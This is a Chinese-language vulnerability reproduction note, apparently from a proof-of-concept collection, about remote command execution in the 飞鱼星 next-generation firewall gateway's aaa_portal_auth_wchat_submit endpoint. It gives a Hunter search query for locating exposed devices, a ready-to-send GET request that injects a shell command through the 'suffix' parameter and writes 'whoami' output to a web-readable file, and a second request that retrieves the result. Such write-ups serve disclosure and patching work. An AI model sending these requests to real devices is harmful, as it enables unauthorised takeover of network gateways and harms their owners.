# 飞鱼星下一代防火墙安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞

# 一、漏洞简介
飞鱼星下一代防火墙安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 飞鱼星下一代防火墙安全网关

# 三、资产测绘
+ hunter`web.title="下一代防火墙安全网关"&&web.body="./webui/js/jquerylib/"`
+ 特征

![1703406555367-82625773-f5ee-47db-a94e-a974cf2112bf.png](./img/3hKIFGXdPlbXJRDM/1703406555367-82625773-f5ee-47db-a94e-a974cf2112bf-028450.png)

# 四、漏洞复现
```plain
GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/stc.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1703406610179-b013056a-1211-4fb4-83ba-6718a16f1150.png](./img/3hKIFGXdPlbXJRDM/1703406610179-b013056a-1211-4fb4-83ba-6718a16f1150-394370.png)

获取命令执行结果

```plain
GET /sslvpn/stc.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1703406632394-be847ae6-b195-4974-bd17-5b3ccbe76f2c.png](./img/3hKIFGXdPlbXJRDM/1703406632394-be847ae6-b195-4974-bd17-5b3ccbe76f2c-297158.png)



> 更新: 2024-09-03 14:56:23  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qc40w8qnkoefmbpx>